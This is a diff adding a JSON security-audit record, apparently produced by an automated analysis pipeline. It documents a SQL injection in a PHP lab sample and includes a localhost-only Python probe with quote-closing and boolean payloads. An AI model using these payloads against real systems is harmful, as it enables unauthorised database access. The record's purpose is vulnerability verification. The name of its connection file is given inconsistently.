@@ -1,0 +1,136 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "medium",
+    "reason": "源码内输入(L8)、拼接(L14)、执行(L15)与回显(L28)链条完整，且无参数化/转义；但连接实现 context/sqli-connect.php 未提供（字符集与 magic_quotes 是否生效未知），运行环境是否支持 mysql_* 及部署路径不明，故未达 high。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入（GET id 字符串拼接进入 WHERE 条件）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 11,
+          "line_end": 11,
+          "quote": "fwrite($fp,'ID:'.$id.\"\\n\");"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 20,
+          "line_end": 20,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "请求进入：顶层脚本在 L6 以 isset($_GET['id']) 判定后，L8 直接读取 GET 参数 $id=$_GET['id'];，未见类型转换、长度限制、白名单或转义。",
+        "旁路写入：L10-L12 打开 result.txt 并以 'ID:'.$id 原样追加写入，$id 未经处理进入文件；该写入不是 SQL 执行路径，属独立风险。",
+        "拼接：L14 将 $id 放进单引号字符串常量内部，构造 SELECT * FROM users WHERE id='$id' LIMIT 0,1；输入落在值位置但可闭合引号并改写 WHERE 结构。",
+        "执行：L15 调用 mysql_query($sql) 将拼接后的完整语句交给数据库，无预处理/绑定参数，也无 mysql_real_escape_string 等转义调用。",
+        "输出观察点：L16-L23 命中行时回显 username/password；L28 在无行分支执行 print_r(mysql_error())，把数据库错误文本输出到页面（尽管 L4 error_reporting(0) 抑制了 PHP 告警）。",
+        "结果：控制 $id 即可改变 WHERE 谓词（恒真/恒假、UNION、报错等），从而越权读取 users 表数据或改变返回行。"
+      ],
+      "principle": "应用把外部可控的 GET 参数 id 直接插入 SQL 字符串字面量（L14）后整体执行（L15），输入与 SQL 结构之间没有参数化或转义边界。单引号可闭合 id='...' 的字面量，随后追加的布尔表达式、UNION SELECT 或注释符会改变查询语义；由于 SELECT * 的行内容在 L20-L22 被回显、L28 还回显数据库错误，语义变化既可盲注也可直接观察。",
+      "impact": "可绕过 id 的业务约束读取 users 表中任意行（含 username/password 字段），或以恒真谓词固定返回首行绕过基于该查询的身份判断；错误回显还可用于基于报错的推断。影响限于该数据库账号权限内可达的表与数据。",
+      "preconditions": [
+        "Web 部署中该脚本可经 HTTP 访问，且 GET 参数 id 传入 L8 分支。",
+        "运行环境提供 mysql_* 函数（PHP 5.x 或装有 mysql 扩展的旧环境），且 context/sqli-connect.php 成功建立连接。",
+        "sql-connect.php 未在连接层启用 magic_quotes/转义或改写 $_GET，也未对 id 做强制整数化。",
+        "users 表存在且查询有权限；数据库错误信息可回显到响应（L28）时可直接观察，否则需布尔/时间差异观察。"
+      ],
+      "counterexamples": [
+        "若连接文件或前置处理对 $_GET['id'] 强制转成整数（如 intval）或使用白名单，则本路径不可注入——本包未提供该文件，无法确证。",
+        "若运行环境启用 magic_quotes_gpc（PHP < 5.4）对输入中的单引号自动加反斜杠，闭合引号会被阻止，普通字符串注入失效（仍可能存在其他形态，需实测）。",
+        "若 L14-L15 被替换为 mysqli/PDO 预处理并绑定参数，或使用 mysql_real_escape_string 且字符集与连接一致，则排除该候选——当前片段中不存在此类代码。",
+        "若该脚本被外层认证/路由拦截且 id 由服务端固定赋值，则外部不可控。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"SQLI-001 local verification draft (authorized lab only).\n\nNormalized sample (local 1-based line numbers):\n  L8   $id=$_GET['id'];\n  L14  $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n  L15  $result=mysql_query($sql);\n  L28  print_r(mysql_error());\n\nOnly http(s) to localhost / 127.0.0.1 / ::1 is accepted; redirects are\nrefused. The script never enumerates schemas or exports table data: it\nonly reports which fixed markers appear in the response.\n\"\"\"\nimport argparse\nimport http.cookiejar\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\nMARKERS = {\n    \"row\": \"Your Login name:\",\n    \"row_pw\": \"Your Password:\",\n    \"need_id\": \"Please input the ID as parameter with numeric value\",\n    \"sql_error\": \"You have an error in your SQL syntax\",\n    \"php_undefined\": \"Call to undefined function\",\n    \"fetch_warning\": \"supplied argument is not a valid MySQL\",\n}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    \"\"\"Refuse redirects so a lab response cannot bounce to another host.\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(\n            req.full_url, code, \"redirect refused: \" + str(newurl), headers, fp\n        )\n\n\ndef build_opener(session_file):\n    handlers = [NoRedirect()]\n    if session_file:\n        jar = http.cookiejar.MozillaCookieJar(session_file)\n        jar.load(ignore_discard=True, ignore_expires=True)\n        handlers.append(urllib.request.HTTPCookieProcessor(jar))\n    return urllib.request.build_opener(*handlers)\n\n\ndef target_url(base_url, path):\n    parts = urllib.parse.urlsplit(base_url)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"base-url must use http or https\")\n    host = (parts.hostname or \"\").strip(\"[]\")\n    if host not in ALLOWED_HOSTS:\n        raise SystemExit(\"refusing non-local host: %r\" % host)\n    if not path.startswith(\"/\"):\n        raise SystemExit(\"path must start with '/': %r\" % path)\n    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, \"\", \"\"))\n\n\ndef fetch(opener, url, timeout):\n    request = urllib.request.Request(\n        url, headers={\"User-Agent\": \"sqli-001-lab-draft/1.0\"}\n    )\n    try:\n        with opener.open(request, timeout=timeout) as response:\n            body = response.read().decode(\"utf-8\", \"replace\")\n            return response.getcode(), body, None\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode(\"utf-8\", \"replace\") if exc.fp else \"\"\n        return exc.code, body, \"http_error\"\n    except (urllib.error.URLError, OSError) as exc:\n        return None, \"\", \"connection_error: %s\" % exc\n\n\ndef run_case(opener, url, param, value, timeout):\n    query = urllib.parse.urlencode({param: value})\n    status, body, error = fetch(opener, url + \"?\" + query, timeout)\n    hits = {name: (marker in body) for name, marker in MARKERS.items()}\n    return {\"status\": status, \"error\": error, \"length\": len(body), \"markers\": hits}\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"SQLI-001 local SQL injection verification draft\"\n    )\n    parser.add_argument(\"--base-url\", required=True,\n                        help=\"e.g. http://127.0.0.1:8080\")\n    parser.add_argument(\"--path\", required=True,\n                        help=\"deployed path of the audited PHP file, e.g. /lab/index.php\")\n    parser.add_argument(\"--param\", default=\"id\",\n                        help=\"GET parameter taken from the code (default: id)\")\n    parser.add_argument(\"--session-file\", default=None,\n                        help=\"optional Netscape-format cookie file for an outer login\")\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\n    args = parser.parse_args()\n\n    url = target_url(args.base_url, args.path)\n    opener = build_opener(args.session_file)\n\n    cases = [\n        (\"baseline\", \"1\"),\n        (\"syntax_probe\", \"1'\"),\n        (\"bool_true\", \"1' AND '1'='1\"),\n        (\"bool_false\", \"1' AND '1'='2\"),\n    ]\n\n    results = {}\n    for label, value in cases:\n        results[label] = run_case(opener, url, args.param, value, args.timeout)\n        item = results[label]\n        print(\"[%s] status=%s len=%s error=%s\" % (\n            label, item[\"status\"], item[\"length\"], item[\"error\"]))\n        for name, present in item[\"markers\"].items():\n            if present:\n                print(\"    marker: %s\" % name)\n        sys.stdout.flush()\n\n    print(\"\")\n    print(\"comparison:\")\n    print(\"  baseline_row=%s bool_true_row=%s bool_false_row=%s\" % (\n        results[\"baseline\"][\"markers\"][\"row\"],\n        results[\"bool_true\"][\"markers\"][\"row\"],\n        results[\"bool_false\"][\"markers\"][\"row\"]))\n    print(\"  syntax_probe_sql_error=%s\" % (\n        results[\"syntax_probe\"][\"markers\"][\"sql_error\"],))\n    print(\"  syntax_probe_php_undefined=%s\" % (\n        results[\"syntax_probe\"][\"markers\"][\"php_undefined\"],))\n    print(\"\")\n    print(\"Interpretation guide (draft; not an execution claim):\")\n    print(\"  - undefined mysql_* functions mean the PHP runtime is incompatible,\")\n    print(\"    not that the input is safe.\")\n    print(\"  - an http_error with a 30x code means the request was redirected\")\n    print(\"    (login/auth); adapt --session-file and --path before concluding.\")\n    print(\"  - a difference in row presence between bool_true and bool_false is\")\n    print(\"    the semantic change to report; do not export table contents.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、http.cookiejar、urllib）",
+          "已按靶场说明部署的本地实例，运行环境需支持 mysql_* 接口"
+        ],
+        "parameters": [
+          "--base-url：本地基址，仅接受 http(s)://localhost、127.0.0.1、[::1]，例如 http://127.0.0.1:8080",
+          "--path：审计脚本的实际部署路径，片段未给出文件名，必须人工填写（例如 /lab/index.php）",
+          "--param：取自代码的 GET 参数名，默认 id（L8 的 $_GET['id']），不得改用未在代码中出现的参数",
+          "--session-file：可选，Netscape 格式 Cookie 文件；仅当部署外层存在登录时使用，不写入版本库",
+          "--timeout：请求超时秒数，默认 10"
+        ],
+        "steps": [
+          "在本地授权靶场部署该脚本及其 ../sql-connections/sql-connect.php、db-creds.inc 与 users 表，记录 PHP/MySQL 版本与部署路径。",
+          "运行：python poc.py --base-url http://127.0.0.1:8080 --path <部署路径> --param id",
+          "脚本依次发送 baseline(id=1)、syntax_probe(id=1')、bool_true(id=1' AND '1'='1)、bool_false(id=1' AND '1'='2) 四个请求，仅打印固定标记命中情况与响应长度，不打印行内容。",
+          "对照 baseline 与 bool_true/bool_false 的行标记差异，并查看 syntax_probe 是否出现 MySQL 语法错误文本。",
+          "如出现重定向或未定义函数提示，先修正部署/会话条件，再重复对照；不得据此判定安全。"
+        ],
+        "expected_observation": "baseline(id=1) 返回包含 'Your Login name:' 的行输出；syntax_probe(id=1') 因引号闭合导致 SQL 语法错误，mysql_query 返回 false，页面进入 L28 分支并输出 MySQL 语法错误文本（或空的黄色字体块），与 baseline 明显不同；bool_true 仍返回行，bool_false 不返回行（页面只剩空的黄色字体块）。若 PHP 版本不支持 mysql_*，则出现 'Call to undefined function mysql_query' 类致命错误，属接口不兼容，不能作为无漏洞证据。",
+        "success_criteria": "在相同部署与同一 users 数据下，仅改变 id 的引号内谓词：baseline 与 bool_true 均出现 'Your Login name:'，bool_false 不出现该标记，且 syntax_probe 的响应中出现 MySQL 语法错误文本或与正常行输出不同的失败形态；同时排除重定向（30x 被拒）、未定义函数与连接错误后，才可记录为 SQL 注入的疑似确认，最终仍需工作包4的实际运行记录。",
+        "limitations": [
+          "本次未运行，脚本仅为草案；execution_status=未运行，无任何响应或日志证据。",
+          "部署路径、会话与连接配置未知，脚本需人工填写 --path（及可能的 --session-file）后才可执行。",
+          "payload 仅做最小语义对照，不枚举数据库、不导出数据；若目标只回显布尔差异而无错误文本，需另行设计时间/布尔观察。",
+          "若部署环境启用了 magic_quotes 或整数化处理，草案中的单引号类 payload 可能失效，需要按实际防护调整，不能据此否定候选。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php 未提供：连接方式、数据库字符集(set names)、magic_quotes/sql_mode、错误模式均未知。",
+    "审计片段声明不能独立部署：部署路径、Web 服务器、PHP 与 MySQL 实际版本未知；mysql_* 需 PHP < 7 或兼容扩展。",
+    "未提供外层认证/路由包装，无法确认 GET id 在部署中是否被前置过滤或重定向保护。",
+    "未提供 users 表结构与数据状态，也未提供任何响应样本、服务器日志或运行记录。"
+  ],
+  "risk_notes": [
+    "L10-L12 将未处理的 $id 追加写入 result.txt：存在日志注入/内容伪造风险，且该文件位于 Web 目录时可能被直接访问导致信息泄露（范围外）。",
+    "L28 print_r(mysql_error()) 直接向页面输出数据库错误，泄露查询结构与库表信息，可辅助报错注入（范围外，但与本候选的观察点相关）。"
+  ],
+  "quality_notes": [
+    "mysql_* 系列函数已在 PHP 7.0 移除，属过时 API，影响可部署性与维护性。",
+    "L4 error_reporting(0) 全局抑制错误，掩盖真实故障；L10 fopen 未检查返回值；L28 对可能非数组的返回值使用 print_r。"
+  ],
+  "limitations": [
+    "结论基于静态审计：输入可控、拼接与执行、输出观察点在片段内完整可见，但无任何运行证据，verdict 保持待验证。",
+    "行号均为 normalized_samples/SQLI-001.php 代码块内 1 起始局部行号；连接文件与部署配置不在本次输入内。",
+    "未验证具体 payload 在目标环境的实际效果；草案为需人工适配的本地验证脚本。"
+  ],
+  "runtime_evidence": []
+}
